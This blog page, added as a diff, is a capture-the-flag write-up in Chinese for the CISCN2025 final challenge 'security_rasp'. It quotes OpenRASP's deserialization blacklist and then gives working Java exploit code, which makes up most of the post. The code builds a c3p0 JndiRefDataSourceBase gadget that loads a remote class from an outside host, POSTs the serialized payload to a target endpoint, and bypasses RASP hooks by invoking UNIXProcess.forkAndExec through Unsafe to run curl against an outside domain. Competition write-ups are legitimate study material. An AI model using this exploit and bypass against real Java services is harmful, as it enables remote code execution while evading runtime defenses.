@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+  <title>
+    
+    CISCN2025 final security security_rasp 丨
+    
+
+    ahQ&#39;s blog
+  </title>
+
+  
+  <link rel="shortcut icon" href="/icon.png">
+  
+
+  <link rel="preconnect" href="https://cdnjs.cloudflare.com">
+  
+  <link id="theme" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-light.css">
+  <script src="https://unpkg.com/@highlightjs/cdn-assets@11.9.0/highlight.min.js"></script>
+  
+
+  <!-- 字体 -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+
+  
+<link rel="stylesheet" href="/css/root.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/post.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <header class="header">
+  <section class="header-container">
+    <img src="/icon.png" width="150" height="150">
+    <a class="logo" href="/"></a>
+    <ul class="nav">
+      
+      <li><a href="/archives">archives</a></li>
+      
+    </ul>
+  </section>
+</header>
+  <main class="main">
+    <article class="post">
+  
+  <div class="post-title">CISCN2025 final security security_rasp</div>
+  <div class="post-meta">
+    <div class="date">2025 July 25th</div>
+    <div class="tags">
+      
+    </div>
+  </div>
+  
+
+  <main class="post-content"><p>分析Jar中的代码可以看到存在c3p0-0.9.5.2的包，版本满足经典c3p0反序列化条件，故可以使用最基础的c3p0链，此处不展开。主要是针对绕过最基础的OpenRASP。</p>
+<h2 id="绕过反序列化链子黑名单"><a href="#绕过反序列化链子黑名单" class="headerlink" title="绕过反序列化链子黑名单"></a>绕过反序列化链子黑名单</h2><p>其中的反序列化链子blacklist如下</p>
+<pre><code class="highlight json"><span class="comment">// transformer 反序列化攻击</span>
+deserialization_blacklist<span class="punctuation">:</span> <span class="punctuation">&#123;</span>
+    name<span class="punctuation">:</span>   &#x27;算法<span class="number">1</span> - 反序列化黑名单过滤&#x27;<span class="punctuation">,</span>
+    action<span class="punctuation">:</span> &#x27;block&#x27;<span class="punctuation">,</span>
+    clazz<span class="punctuation">:</span> <span class="punctuation">[</span>
+        &#x27;org.apache.commons.collections.functors.ChainedTransformer&#x27;<span class="punctuation">,</span>
+        &#x27;org.apache.commons.collections.functors.InvokerTransformer&#x27;<span class="punctuation">,</span>
+        &#x27;org.apache.commons.collections.functors.InstantiateTransformer&#x27;<span class="punctuation">,</span>
+        &#x27;org.apache.commons.collections4.functors.InvokerTransformer&#x27;<span class="punctuation">,</span>
+        &#x27;org.apache.commons.collections4.functors.InstantiateTransformer&#x27;<span class="punctuation">,</span>
+        &#x27;org.codehaus.groovy.runtime.ConvertedClosure&#x27;<span class="punctuation">,</span>
+        &#x27;org.codehaus.groovy.runtime.MethodClosure&#x27;<span class="punctuation">,</span>
+        &#x27;org.springframework.beans.factory.ObjectFactory&#x27;<span class="punctuation">,</span>
+        &#x27;org.apache.xalan.xsltc.trax.TemplatesImpl&#x27;<span class="punctuation">,</span>
+        &#x27;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#x27;<span class="punctuation">,</span>
+        &#x27;com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase&#x27;
+    <span class="punctuation">]</span>
+<span class="punctuation">&#125;</span><span class="punctuation">,</span></code></pre>
+
+<p>可以看到<code>com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase</code>被ban了，故找到另外一个类替代<code>com.mchange.v2.c3p0.impl.JndiRefDataSourceBase</code></p>
+<p>反序列化构造Exp</p>
+<pre><code class="highlight java"><span class="keyword">import</span> utils.SerializeUtil;
+
+<span class="keyword">import</span> javax.naming.NamingException;
+<span class="keyword">import</span> javax.naming.Reference;
+<span class="keyword">import</span> javax.naming.Referenceable;
+<span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;
+<span class="keyword">import</span> javax.sql.PooledConnection;
+<span class="keyword">import</span> java.io.*;
+<span class="keyword">import</span> java.lang.reflect.Constructor;
+<span class="keyword">import</span> java.lang.reflect.Field;
+<span class="keyword">import</span> java.net.HttpURLConnection;
+<span class="keyword">import</span> java.net.URL;
+<span class="keyword">import</span> java.net.URLEncoder;
+<span class="keyword">import</span> java.sql.SQLException;
+<span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;
+<span class="keyword">import</span> java.util.Base64;
+<span class="keyword">import</span> java.util.logging.Logger;
+
+<span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P01_1</span> &#123;
+
+    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">C3P0</span> <span class="keyword">implements</span> <span class="title class_">ConnectionPoolDataSource</span>, Referenceable&#123;
+
+        <span class="meta">@Override</span>
+        <span class="keyword">public</span> Reference <span class="title function_">getReference</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;
+            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;CommandExecutor&quot;</span>,<span class="string">&quot;CommandExecutor&quot;</span>,<span class="string">&quot;http://192.168.6.126/&quot;</span>);
+        &#125;
+
+        <span class="meta">@Override</span>
+        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;
+            <span class="keyword">return</span> <span class="literal">null</span>;
+        &#125;
+
+        <span class="meta">@Override</span>
+        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">(String user, String password)</span> <span class="keyword">throws</span> SQLException &#123;
+            <span class="keyword">return</span> <span class="literal">null</span>;
+        &#125;
+
+        <span class="meta">@Override</span>
+        <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;
+            <span class="keyword">return</span> <span class="literal">null</span>;
+        &#125;
+
+        <span class="meta">@Override</span>
+        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span><span class="params">(PrintWriter out)</span> <span class="keyword">throws</span> SQLException &#123;
+
+        &#125;
+
+        <span class="meta">@Override</span>
+        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span> <span class="keyword">throws</span> SQLException &#123;
+
+        &#125;
+
+        <span class="meta">@Override</span>
+        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;
+            <span class="keyword">return</span> <span class="number">0</span>;
+        &#125;
+
+        <span class="meta">@Override</span>
+        <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;
+            <span class="keyword">return</span> <span class="literal">null</span>;
+        &#125;
+    &#125;
+
+
+    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(ConnectionPoolDataSource lp)</span> <span class="keyword">throws</span> Exception&#123;
+
+        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;com.mchange.v2.c3p0.impl.JndiRefDataSourceBase&quot;</span>);
+        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor();
+        constructor.setAccessible(<span class="literal">true</span>); <span class="comment">// 如果是 private 的</span>
+
+        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance();
+
+        SerializeUtil.setFieldValue(o, <span class="string">&quot;jndiName&quot;</span>, lp);
+
+
+<span class="comment">//        PoolBackedDataSourceBase poolBackedDataSourceBase = new PoolBackedDataSourceBase(false);</span>
+<span class="comment">//        Field connectionPoolDataSourceField = PoolBackedDataSourceBase.class.getDeclaredField(&quot;connectionPoolDataSource&quot;);</span>
+<span class="comment">//        connectionPoolDataSourceField.setAccessible(true);</span>
+<span class="comment">//        connectionPoolDataSourceField.set(poolBackedDataSourceBase,lp);</span>
+
+        <span class="keyword">try</span>(<span class="type">ByteArrayOutputStream</span> <span class="variable">baout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();
+            <span class="type">ObjectOutputStream</span> <span class="variable">oout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baout))&#123;
+            oout.writeObject(o);
+            <span class="type">byte</span>[] bytes = baout.toByteArray();
+<span class="comment">//</span>
+<span class="comment">//            final ByteArrayInputStream in = new ByteArrayInputStream(bytes);</span>
+<span class="comment">//            final ObjectInputStream objIn = new ObjectInputStream(in);</span>
+<span class="comment">//            objIn.readObject();</span>
+
+            <span class="comment">// 2. 编码为 Base64 字符串</span>
+            <span class="type">String</span> <span class="variable">base64Data</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(bytes);
+
+            <span class="comment">// 3. 构造 POST 请求</span>
+            <span class="type">String</span> <span class="variable">targetUrl</span> <span class="operator">=</span> <span class="string">&quot;http://192.168.6.126:8080/user/info&quot;</span>; <span class="comment">// ⚠️修改为你的实际接口地址</span>
+            <span class="type">String</span> <span class="variable">urlParameters</span> <span class="operator">=</span> <span class="string">&quot;data=&quot;</span> + URLEncoder.encode(base64Data, <span class="string">&quot;UTF-8&quot;</span>);
+
+            <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(targetUrl);
+            <span class="type">HttpURLConnection</span> <span class="variable">conn</span> <span class="operator">=</span> (HttpURLConnection) url.openConnection();
+
+            conn.setRequestMethod(<span class="string">&quot;POST&quot;</span>);
+            conn.setDoOutput(<span class="literal">true</span>);
+            conn.setRequestProperty(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);
+
+            <span class="keyword">try</span> (<span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> conn.getOutputStream()) &#123;
+                os.write(urlParameters.getBytes());
+                os.flush();
+            &#125;
+
+            <span class="comment">// 4. 读取响应</span>
+            <span class="type">int</span> <span class="variable">responseCode</span> <span class="operator">=</span> conn.getResponseCode();
+            System.out.println(<span class="string">&quot;HTTP Response Code: &quot;</span> + responseCode);
+
+            <span class="keyword">try</span> (<span class="type">BufferedReader</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(conn.getInputStream()))) &#123;
+                String line;
+                System.out.println(<span class="string">&quot;Response:&quot;</span>);
+                <span class="keyword">while</span> ((line = in.readLine()) != <span class="literal">null</span>) &#123;
+                    System.out.println(line);
+                &#125;
+            &#125;
+
+            conn.disconnect();
+
+        &#125;
+    &#125;
+
+&#125;</code></pre>
+
+<h2 id="绕过RASP对Runtime-getRuntime-exec的插桩"><a href="#绕过RASP对Runtime-getRuntime-exec的插桩" class="headerlink" title="绕过RASP对Runtime.getRuntime().exec的插桩"></a>绕过RASP对Runtime.getRuntime().exec的插桩</h2><p>在linux下主要使用forkAndExec,Exp如下</p>
+<pre><code class="highlight java"><span class="keyword">import</span> sun.misc.Unsafe;
+<span class="keyword">import</span> java.lang.reflect.Field;
+<span class="keyword">import</span> java.lang.reflect.Method;
+<span class="keyword">import</span> java.util.Map;
+
+<span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommandExecutor</span> &#123;
+
+    <span class="keyword">static</span> <span class="type">byte</span>[] helperpath;
+
+    <span class="keyword">public</span> <span class="title function_">CommandExecutor</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;
+
+        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.UNIXProcess&quot;</span>);
+
+        <span class="keyword">for</span> (Method m : clazz.getDeclaredMethods()) &#123;
+            <span class="keyword">if</span> (m.getName().endsWith(<span class="string">&quot;forkAndExec&quot;</span>)) &#123;
+                m.setAccessible(<span class="literal">true</span>);
+                linuxCmd(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;curl http://kzeciiyxxj.zaza.eu.org&quot;</span>&#125;,m);
+            &#125;
+        &#125;
+    &#125;
+
+
+    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">linuxCmd</span><span class="params">(String[] var0,Method forkAndExec)</span> <span class="keyword">throws</span> Exception&#123;
+        <span class="type">Field</span> <span class="variable">theUnsafe</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);
+        theUnsafe.setAccessible(<span class="literal">true</span>);
+
+        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) theUnsafe.get(<span class="literal">null</span>);
+        Class&lt;?&gt; UNIXProcessClass = Class.forName(<span class="string">&quot;java.lang.UNIXProcess&quot;</span>);
+        Class&lt;?&gt; ProcessImplClass = Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);
+        <span class="type">Object</span> <span class="variable">unixProc</span> <span class="operator">=</span> unsafe.allocateInstance(UNIXProcessClass);
+
+        <span class="keyword">if</span> (forkAndExec == <span class="literal">null</span>) &#123;
+            forkAndExec = UNIXProcessClass.getDeclaredMethod(<span class="string">&quot;forkAndExec&quot;</span>,
+                    <span class="type">int</span>.class, <span class="type">byte</span>[].class, <span class="type">byte</span>[].class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">byte</span>[].class, <span class="type">int</span>[].class,
+                    <span class="type">boolean</span>.class);
+            forkAndExec.setAccessible(<span class="literal">true</span>);
+        &#125;
+
+
+        <span class="type">byte</span>[][] var5 = <span class="keyword">new</span> <span class="title class_">byte</span>[var0.length - <span class="number">1</span>][];
+        <span class="type">int</span> <span class="variable">var6</span> <span class="operator">=</span> var5.length;
+
+        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var7</span> <span class="operator">=</span> <span class="number">0</span>; var7 &lt; var5.length; ++var7) &#123;
+            var5[var7] = var0[var7 + <span class="number">1</span>].getBytes();
+            var6 += var5[var7].length;
+        &#125;
+
+        <span class="type">byte</span>[] var70 = <span class="keyword">new</span> <span class="title class_">byte</span>[var6];
+        <span class="type">int</span> <span class="variable">var8</span> <span class="operator">=</span> <span class="number">0</span>;
+        <span class="type">byte</span>[][] var9 = var5;
+        <span class="type">int</span> <span class="variable">var10</span> <span class="operator">=</span> var5.length;
+
+        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var11</span> <span class="operator">=</span> <span class="number">0</span>; var11 &lt; var10; ++var11) &#123;
+            <span class="type">byte</span>[] var12 = var9[var11];
+            System.arraycopy(var12, <span class="number">0</span>, var70, var8, var12.length);
+            var8 += var12.length + <span class="number">1</span>;
+        &#125;
+        <span class="type">int</span>[] var71 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">1</span>];
+        Map&lt;String, String&gt; var1 = <span class="literal">null</span>;
+        <span class="comment">//byte[] var72 = ProcessEnvironment.toEnvironmentBlock(var1, var71);</span>
+        <span class="type">byte</span>[] var72 = <span class="literal">null</span>;
+        <span class="type">String</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;
+
+        <span class="type">boolean</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="literal">false</span>;
+        <span class="type">int</span>[] var73 = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123; -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span> &#125;;
+        <span class="type">Method</span> <span class="variable">toCString</span> <span class="operator">=</span> ProcessImplClass.getDeclaredMethod(<span class="string">&quot;toCString&quot;</span>, String.class);
+        toCString.setAccessible(<span class="literal">true</span>);
+
+        <span class="type">Field</span> <span class="variable">helperpathField</span> <span class="operator">=</span> UNIXProcessClass.getDeclaredField(<span class="string">&quot;helperpath&quot;</span>);
+        helperpathField.setAccessible(<span class="literal">true</span>);
+        helperpath = (<span class="type">byte</span>[]) helperpathField.get(<span class="literal">null</span>);
+        ForkAndExec(forkAndExec, unixProc,
+                (<span class="type">byte</span>[])toCString.invoke(<span class="literal">null</span>, var0[<span class="number">0</span>]), var70, var5.length,
+                var72, var71[<span class="number">0</span>],  (<span class="type">byte</span>[])toCString.invoke(<span class="literal">null</span>, var2), var73, var4);
+
+    &#125;
+
+    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">ForkAndExec</span><span class="params">(</span>
+<span class="params">            Method forkAndExec,</span>
+<span class="params">            Object unixProc,</span>
+<span class="params">            <span class="type">byte</span>[] var1, <span class="type">byte</span>[] var2, <span class="type">int</span> var3, <span class="type">byte</span>[] var4, <span class="type">int</span> var5, <span class="type">byte</span>[] var6, <span class="type">int</span>[] var7, <span class="type">boolean</span> var8</span>
+<span class="params">    )</span> <span class="keyword">throws</span> Exception &#123;
+
+<span class="comment">//private static final UNIXProcess.LaunchMechanism launchMechanism;</span>
+        <span class="type">Class</span> <span class="variable">UNIXProcessClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.UNIXProcess&quot;</span>);
+        <span class="type">Field</span> <span class="variable">launchMechanismField</span> <span class="operator">=</span> UNIXProcessClass.getDeclaredField(<span class="string">&quot;launchMechanism&quot;</span>);
+        launchMechanismField.setAccessible(<span class="literal">true</span>);
+        <span class="type">Object</span> <span class="variable">launchMechanism</span> <span class="operator">=</span> launchMechanismField.get(unixProc);
+
+        <span class="type">int</span> <span class="variable">firstPara</span> <span class="operator">=</span> (<span class="type">int</span>) Enum.class.getDeclaredMethod(<span class="string">&quot;ordinal&quot;</span>).invoke(launchMechanism) + <span class="number">1</span>;
+        forkAndExec.invoke(unixProc, firstPara , helperpath, var1, var2, var3, var4, var5, var6, var7, var8);
+
+    &#125;
+
+    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;
+        <span class="keyword">new</span> <span class="title class_">CommandExecutor</span>();
+    &#125;
+
+&#125;</code></pre>
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>反序列化相关：</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://tttang.com/archive/1886/#toc_exp">https://tttang.com/archive/1886/#toc_exp</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/fdu-sec/JDD/tree/main">https://github.com/fdu-sec/JDD/tree/main</a></li>
+</ol>
+<p>绕过RASP命令执行：<a target="_blank" rel="noopener" href="https://github.com/turn1tup/JvmRaspBypass/tree/main/src/main/java/com/test">https://github.com/turn1tup/JvmRaspBypass/tree/main/src/main/java/com/test</a></p>
+</main>
+
+</article>
+
+
+<script src="/js/highlight.js"></script>
+
+  </main>
+  <footer class="footer">
+  
+  <span>Copyright © 2025–Present ahQ. All rights reserved.</span>
+  
+</footer>
+  
+<script src="/js/theme.js"></script>
+
+</body>
+
+</html>
